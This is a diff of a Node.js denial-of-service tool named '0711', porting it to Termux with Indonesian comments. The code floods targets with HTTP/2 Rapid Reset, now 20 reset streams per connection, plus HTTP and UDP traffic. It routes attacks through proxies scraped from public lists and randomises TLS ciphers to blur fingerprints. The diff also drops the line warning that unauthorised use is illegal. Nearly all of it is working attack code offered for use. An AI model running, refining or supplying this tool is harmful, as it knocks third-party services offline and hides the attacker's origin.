@@ -1,18 +1,15 @@
 #!/usr/bin/env node
 /**
  * =====================================================================
- *                         🔱 0711 – ULTIMATE EDITION v2.2 🔱
- *                 Advanced Multi‑Worker Layer7 & UDP Stress Tool
- *           HTTP/2 Rapid Reset, Slowloris, RUDY, Random Payloads,
- *           Proxy Rotation, Multi‑Target, Real‑time Dashboard
+ *                         🔱 0711 – TERMUX EDITION 🔱
+ *                     Optimized for Limited Resources
+ *   HTTP/2 Rapid Reset, Slowloris, RUDY, Proxy Rotation, Dashboard
  * =====================================================================
  * 
- * USAGE:
- *   node 0711.js --target example.com --port 443 --workers 50 --duration 120
- *   node 0711.js --target example.com --mode rapid_reset --workers 5 --duration 30
+ * USAGE (Termux):
+ *   node 0711.js --target example.com --workers 5 --duration 30
  * 
  * ⚠️  WARNING: Use only on systems you own or have explicit permission.
- *     Unauthorized use is ILLEGAL and may result in criminal penalties.
  * =====================================================================
  */
 
@@ -35,7 +32,7 @@ const CONFIG = {
     target: 'example.com',
     targets: [],
     ports: [443, 80],
-    workersPerPort: 50,
+    workersPerPort: 5,         // Default rendah untuk Termux
     duration: 120,
     attackType: 'https',
     attackMode: 'normal',
@@ -49,9 +46,6 @@ const CONFIG = {
         'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
         'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
         'https://proxylist.rip/proxy/http/format/txt/',
-        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000',
-        'https://www.proxy-list.download/api/v1/get?type=socks5',
-        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
     ],
     userAgentsFile: null,
     payloadsFile: null,
@@ -61,7 +55,7 @@ const CONFIG = {
     logFile: '0711.log',
     verbose: false,
     maxConsecutiveFailures: 3,
-    maxErrorsPerWorker: 1000,
+    maxErrorsPerWorker: 200,    // Turunkan agar worker berhenti lebih cepat
     backoffBase: 1000,
     maxBackoff: 30000,
     customHeaders: {},
@@ -121,11 +115,23 @@ function parseArgs() {
     const args = process.argv.slice(2);
     const parsed = {};
     for (let i = 0; i < args.length; i++) {
-        const arg = args[i];
+        let arg = args[i];
+        let key, value;
+        // Handle --key=value
+        if (arg.startsWith('--') && arg.includes('=')) {
+            [key, value] = arg.slice(2).split('=', 2);
+            parsed[key] = value;
+            continue;
+        }
         if (arg.startsWith('--')) {
-            const key = arg.slice(2);
-            const value = args[i+1] && !args[i+1].startsWith('--') ? args[i+1] : true;
-            if (value !== true) i++;
+            key = arg.slice(2);
+            const next = args[i+1];
+            if (next && !next.startsWith('--')) {
+                value = next;
+                i++;
+            } else {
+                value = true;
+            }
             parsed[key] = value;
         }
     }
@@ -137,6 +143,14 @@ function normalizeTarget(input) {
     let cleaned = input.trim();
     cleaned = cleaned.replace(/^https?:\/\//, '');
     cleaned = cleaned.replace(/\/$/, '');
+    // Handle IPv6 [2001:db8::1]:443
+    if (cleaned.startsWith('[') && cleaned.includes(']')) {
+        const match = cleaned.match(/^\[([^\]]+)\](?::(\d+))?$/);
+        if (match) {
+            return match[1]; // return IPv6 tanpa port
+        }
+    }
+    // IPv4 / domain
     cleaned = cleaned.split(':')[0];
     return cleaned;
 }
@@ -203,6 +217,21 @@ async function main() {
 
     if (cmdArgs.workers) config.workersPerPort = parseInt(cmdArgs.workers);
 
+    // CAP total worker untuk Termux (maks 4x CPU cores)
+    const maxAllowedWorkers = Math.max(4, os.cpus().length * 2);
+    let totalWorkers = config.targets.length * config.ports.length * config.workersPerPort;
+    if (totalWorkers > maxAllowedWorkers) {
+        logger.warn(`Total workers (${totalWorkers}) melebihi batas (${maxAllowedWorkers}). Dikurangi ke ${maxAllowedWorkers}.`);
+        // Turunkan workersPerPort proporsional
+        const targetPortCount = config.targets.length * config.ports.length;
+        if (targetPortCount > 0) {
+            config.workersPerPort = Math.floor(maxAllowedWorkers / targetPortCount);
+            if (config.workersPerPort < 1) config.workersPerPort = 1;
+            totalWorkers = targetPortCount * config.workersPerPort;
+            logger.info(`Workers disesuaikan menjadi ${config.workersPerPort} per port (total ${totalWorkers}).`);
+        }
+    }
+
     config.durationMs = config.duration > 0 ? config.duration * 1000 : null;
 
     // Load user agents
@@ -226,13 +255,9 @@ async function main() {
         } catch (e) {}
     }
 
-    // ===== Proxy Manager =====
+    // ===== Proxy Manager (Parallel fetch) =====
     let proxyList = [];
-    const FALLBACK_PROXIES = [
-        '103.250.3.60:3128', '103.174.178.38:3128', '103.87.56.129:3128',
-        '103.94.160.141:8080', '103.94.160.142:8080', '103.94.160.143:8080',
-        '103.94.160.144:8080', '103.94.160.145:8080', '103.94.160.146:8080',
-    ];
+    // Fallback proxies dihapus karena 99% mati, lebih baik kosong
 
     async function fetchProxies() {
         if (!config.proxyAuto && !config.proxyFile) return;
@@ -250,41 +275,44 @@ async function main() {
 
         if (config.proxyAuto) {
             const sources = config.proxySources || CONFIG.proxySources;
-            for (const src of sources) {
-                try {
-                    const urlObj = new URL(src);
-                    const protocol = urlObj.protocol === 'https:' ? https : http;
-                    const rawData = await new Promise((resolve, reject) => {
-                        const req = protocol.get(urlObj, (res) => {
-                            let data = '';
-                            res.on('data', chunk => data += chunk);
-                            res.on('end', () => resolve(data));
-                            res.on('error', reject);
+            // Parallel fetch
+            const results = await Promise.allSettled(
+                sources.map(async (src) => {
+                    try {
+                        const urlObj = new URL(src);
+                        const protocol = urlObj.protocol === 'https:' ? https : http;
+                        const rawData = await new Promise((resolve, reject) => {
+                            const req = protocol.get(urlObj, (res) => {
+                                let data = '';
+                                res.on('data', chunk => data += chunk);
+                                res.on('end', () => resolve(data));
+                                res.on('error', reject);
+                            });
+                            req.setTimeout(8000, () => {
+                                req.destroy();
+                                reject(new Error('Timeout'));
+                            });
+                            req.on('error', reject);
                         });
-                        req.setTimeout(8000, () => {
-                            req.destroy();
-                            reject(new Error('Timeout'));
-                        });
-                        req.on('error', reject);
-                    });
-                    rawData.split('\n').forEach(line => {
-                        const l = line.trim();
-                        if (l && l.includes(':') && !l.startsWith('[') && !l.startsWith('#')) {
-                            const [host, port] = l.split(':');
-                            if (net.isIP(host) && port > 0 && port < 65536) {
-                                all.add(l);
-                            }
-                        }
-                    });
-                } catch (e) {
-                    if (config.verbose) logger.debug(`Failed ${src}: ${e.message}`);
-                }
-            }
-        }
-
-        if (all.size === 0) {
-            logger.warn('No proxies fetched. Using fallback proxies.');
-            for (const p of FALLBACK_PROXIES) all.add(p);
+                        const lines = rawData.split('\n');
+                        const proxies = lines
+                            .map(l => l.trim())
+                            .filter(l => l && l.includes(':') && !l.startsWith('[') && !l.startsWith('#'))
+                            .map(l => {
+                                const [host, port] = l.split(':');
+                                if (net.isIP(host) && port > 0 && port < 65536) {
+                                    return l;
+                                }
+                                return null;
+                            })
+                            .filter(Boolean);
+                        if (proxies.length > 0) all.add(...proxies);
+                        if (config.verbose) logger.debug(`Fetched ${proxies.length} from ${src}`);
+                    } catch (e) {
+                        if (config.verbose) logger.debug(`Failed ${src}: ${e.message}`);
+                    }
+                })
+            );
         }
 
         proxyList = Array.from(all);
@@ -346,7 +374,7 @@ async function main() {
                             proxyList: this.proxyList,
                             payloadTemplates: this.payloadTemplates,
                             maxConsecutiveFailures: this.config.maxConsecutiveFailures || 3,
-                            maxErrorsPerWorker: this.config.maxErrorsPerWorker || 1000,
+                            maxErrorsPerWorker: this.config.maxErrorsPerWorker || 200,
                             backoffBase: this.config.backoffBase || 1000,
                             maxBackoff: this.config.maxBackoff || 30000,
                             verbose: this.config.verbose || false,
@@ -391,13 +419,14 @@ async function main() {
                 }
             }
 
+            // Stats interval 500ms untuk mengurangi IPC
             const statsInterval = setInterval(() => {
                 const elapsed = (Date.now() - this.stats.startTime) / 1000;
                 const rate = this.stats.total / (elapsed || 1);
                 const success = Math.max(0, this.stats.total - this.stats.failed - this.stats.serverErrors);
                 const successRate = this.stats.total > 0 ? ((success / this.stats.total) * 100).toFixed(1) : 0;
                 console.log(`\x1b[36m[STATS]\x1b[0m Total: ${this.stats.total} | Success: ${success} | Failed: ${this.stats.failed} | ServerErr: ${this.stats.serverErrors} | Active: ${this.stats.activeWorkers} | Rate: ${rate.toFixed(1)} req/s | SuccessRate: ${successRate}% | Elapsed: ${elapsed.toFixed(1)}s`);
-            }, 1000);
+            }, 500);
 
             const sigIntHandler = async () => {
                 if (this.isStopping) return;
@@ -469,7 +498,7 @@ async function main() {
         }
     }
 
-    // ===== Worker Code (FIXED with IIFE async) =====
+    // ===== Worker Code (FIXED for Termux) =====
     const WORKER_CODE = `
 (async () => {
 const { parentPort, workerData } = require('worker_threads');
@@ -489,7 +518,9 @@ const {
 let sent = 0, active = 0, errors = 0, serverErrors = 0;
 let isStopping = false;
 let consecutiveFailures = 0;
-let socket = null;
+let socket = null;           // proxy socket
+let tlsConn = null;          // TLS connection
+let http2Client = null;
 let durationTimer = null;
 let currentProxyIndex = 0;
 
@@ -509,7 +540,7 @@ function getProxy() {
     return p;
 }
 
-// --- Cipher suite list (randomized) ---
+// Cipher list (untuk fingerprint samar)
 const CIPHER_LIST = [
     'ECDHE-RSA-AES128-GCM-SHA256',
     'ECDHE-ECDSA-AES128-GCM-SHA256',
@@ -546,7 +577,19 @@ function cleanup(reason) {
     if (isStopping) return;
     isStopping = true;
     if (durationTimer) { clearTimeout(durationTimer); durationTimer = null; }
-    if (socket) { try { socket.destroy(); } catch(e) {} socket = null; }
+    // Tutup semua koneksi
+    if (http2Client && !http2Client.destroyed) {
+        http2Client.destroy();
+        http2Client = null;
+    }
+    if (tlsConn && !tlsConn.destroyed) {
+        tlsConn.destroy();
+        tlsConn = null;
+    }
+    if (socket && !socket.destroyed) {
+        socket.destroy();
+        socket = null;
+    }
     active = 0;
     sendStats({ workerId, reason });
     parentPort.postMessage({ type: 'done', workerId });
@@ -561,8 +604,10 @@ if (durationMs && durationMs > 0) {
 
 // --- HTTP/2 Normal Attack ---
 async function http2NormalAttack() {
+    let statsCounter = 0;
     while (!isStopping) {
         sent++;
+        statsCounter++;
         if (errors > maxErrorsPerWorker) {
             cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
             return;
@@ -570,11 +615,11 @@ async function http2NormalAttack() {
         let errorLogged = false;
         try {
             const proxy = getProxy();
-            let tlsConn;
+            // Build connection
+            let proxySocket = null;
             if (proxy) {
                 const [proxyHost, proxyPort] = proxy.split(':');
-                const proxySocket = net.connect(proxyPort, proxyHost);
-                proxySocket.write(\`CONNECT \${targetIP}:443 HTTP/1.1\\r\\nHost: \${targetIP}\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\`);
+                proxySocket = net.connect(proxyPort, proxyHost);
                 await new Promise((resolve, reject) => {
                     proxySocket.once('data', (data) => {
                         if (data.toString().includes('200 Connection established')) {
@@ -602,12 +647,13 @@ async function http2NormalAttack() {
                 });
             }
             active = 1;
-            sendStats();
+            // Kirim stats tiap 10 request untuk kurangi IPC
+            if (statsCounter % 10 === 0) sendStats();
 
-            const client = http2.connect(\`https://\${targetIP}\`, { createConnection: () => tlsConn });
-            client.on('error', (err) => {
+            http2Client = http2.connect(\`https://\${targetIP}\`, { createConnection: () => tlsConn });
+            http2Client.on('error', (err) => {
                 if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
-                client.destroy();
+                http2Client.destroy();
             });
 
             const payload = randPayload();
@@ -628,19 +674,26 @@ async function http2NormalAttack() {
             };
             if (customHeaders) Object.assign(headers, customHeaders);
 
-            const req = client.request(headers);
+            const req = http2Client.request(headers);
             req.on('response', (response) => {
                 consecutiveFailures = 0;
                 const status = response.headers[':status'] || 0;
                 if (status >= 400 && status < 600) serverErrors++;
                 sendStats();
                 req.destroy();
-                client.destroy();
+                http2Client.destroy();
+                // Reset koneksi
+                if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
+                if (socket && !socket.destroyed) socket.destroy();
+                active = 0;
             });
             req.on('error', (err) => {
                 if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
                 req.destroy();
-                client.destroy();
+                http2Client.destroy();
+                if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
+                if (socket && !socket.destroyed) socket.destroy();
+                active = 0;
             });
             req.end();
             await sleep(10 + rand(20));
@@ -650,15 +703,22 @@ async function http2NormalAttack() {
                 cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);
                 return;
             }
+            // Cleanup on error
+            if (http2Client && !http2Client.destroyed) http2Client.destroy();
+            if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
+            if (socket && !socket.destroyed) socket.destroy();
+            active = 0;
             await sleep(2000 + rand(3000));
         }
     }
 }
 
-// --- HTTP/2 Rapid Reset Attack (CVE-2023-44487) ---
+// --- HTTP/2 Rapid Reset (massal) ---
 async function http2RapidResetAttack() {
+    let statsCounter = 0;
     while (!isStopping) {
         sent++;
+        statsCounter++;
         if (errors > maxErrorsPerWorker) {
             cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
             return;
@@ -666,11 +726,10 @@ async function http2RapidResetAttack() {
         let errorLogged = false;
         try {
             const proxy = getProxy();
-            let tlsConn;
+            let proxySocket = null;
             if (proxy) {
                 const [proxyHost, proxyPort] = proxy.split(':');
-                const proxySocket = net.connect(proxyPort, proxyHost);
-                proxySocket.write(\`CONNECT \${targetIP}:443 HTTP/1.1\\r\\nHost: \${targetIP}\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\`);
+                proxySocket = net.connect(proxyPort, proxyHost);
                 await new Promise((resolve, reject) => {
                     proxySocket.once('data', (data) => {
                         if (data.toString().includes('200 Connection established')) {
@@ -698,12 +757,12 @@ async function http2RapidResetAttack() {
                 });
             }
             active = 1;
-            sendStats();
+            if (statsCounter % 10 === 0) sendStats();
 
-            const client = http2.connect(\`https://\${targetIP}\`, { createConnection: () => tlsConn });
-            client.on('error', (err) => {
+            http2Client = http2.connect(\`https://\${targetIP}\`, { createConnection: () => tlsConn });
+            http2Client.on('error', (err) => {
                 if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
-                client.destroy();
+                http2Client.destroy();
             });
 
             const payload = randPayload();
@@ -724,14 +783,23 @@ async function http2RapidResetAttack() {
             };
             if (customHeaders) Object.assign(headers, customHeaders);
 
-            const req = client.request(headers);
-            req.on('error', () => {});
-            req.end();
-            req.destroy(); // RST_STREAM langsung
-
-            if (rand(10) === 0) client.destroy();
-
-            sendStats();
+            // Kirim 20 stream sekaligus lalu RST semuanya
+            const streams = [];
+            for (let i = 0; i < 20; i++) {
+                const req = http2Client.request(headers);
+                req.on('error', () => {});
+                req.end();
+                streams.push(req);
+            }
+            // Langsung RST semua stream
+            for (const req of streams) {
+                req.destroy();
+            }
+            // Tutup koneksi setelah reset
+            http2Client.destroy();
+            if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
+            if (socket && !socket.destroyed) socket.destroy();
+            active = 0;
             await sleep(1 + rand(5));
         } catch (err) {
             if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
@@ -739,6 +807,10 @@ async function http2RapidResetAttack() {
                 cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);
                 return;
             }
+            if (http2Client && !http2Client.destroyed) http2Client.destroy();
+            if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
+            if (socket && !socket.destroyed) socket.destroy();
+            active = 0;
             await sleep(100 + rand(300));
         }
     }
@@ -753,20 +825,22 @@ async function udpAttack() {
     });
     udpSocket.on('message', () => { serverErrors++; sendStats(); });
     const startTime = Date.now();
+    let statsCounter = 0;
     while (!isStopping) {
         sent++;
+        statsCounter++;
         if (errors > maxErrorsPerWorker) {
             cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
             return;
         }
         if (durationMs && Date.now() - startTime > durationMs) break;
         try {
-            const payload = Buffer.from(randStr(500 + rand(500)));
+            const payload = Buffer.from(randStr(1400)); // lebih besar
             udpSocket.send(payload, port, targetIP, (err) => {
                 if (err) {
                     if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
                 } else {
-                    sendStats();
+                    if (statsCounter % 10 === 0) sendStats();
                 }
             });
             await sleep(1 + rand(10));
@@ -803,9 +877,11 @@ if (attackType === 'udp') {
         await http2NormalAttack();
     }
 } else {
-    // HTTP/1.1 fallback
+    // HTTP/1.1 fallback (sederhana)
+    let statsCounter = 0;
     while (!isStopping) {
         sent++;
+        statsCounter++;
         if (errors > maxErrorsPerWorker) break;
         let errorLogged = false;
         try {
@@ -833,7 +909,7 @@ if (attackType === 'udp') {
                 consecutiveFailures = 0;
                 const status = response.statusCode || 0;
                 if (status >= 400 && status < 600) serverErrors++;
-                sendStats();
+                if (statsCounter % 10 === 0) sendStats();
                 req.destroy();
             });
             req.on('error', (err) => {
@@ -855,7 +931,19 @@ if (attackType === 'udp') {
 `;
 
     // ===== Eksekusi =====
-    logger.info('Initializing 0711 Ultimate Edition v2.2...');
+    logger.info('Initializing 0711 Termux Edition...');
+
+    // Cek dashboard dependencies
+    if (config.dashboard) {
+        try {
+            require.resolve('express');
+            require.resolve('cors');
+        } catch (e) {
+            logger.error('Dashboard dependencies not installed. Run: npm install express cors');
+            logger.warn('Dashboard disabled.');
+            config.dashboard = false;
+        }
+    }
 
     if (config.proxyAuto || config.proxyFile) {
         await fetchProxies();
@@ -899,7 +987,7 @@ if (attackType === 'udp') {
                 logger.success(`Dashboard running at http://localhost:${config.dashboardPort}/stats`);
             });
         } catch (e) {
-            logger.warn('Dashboard dependencies not installed. Install express & cors.');
+            logger.warn('Dashboard failed to start.');
         }
     }
 
@@ -912,4 +1000,4 @@ if (require.main === module) {
         console.error('\x1b[31m[FATAL]\x1b[0m', err);
         process.exit(1);
     });
-                                                                                                            }
+}
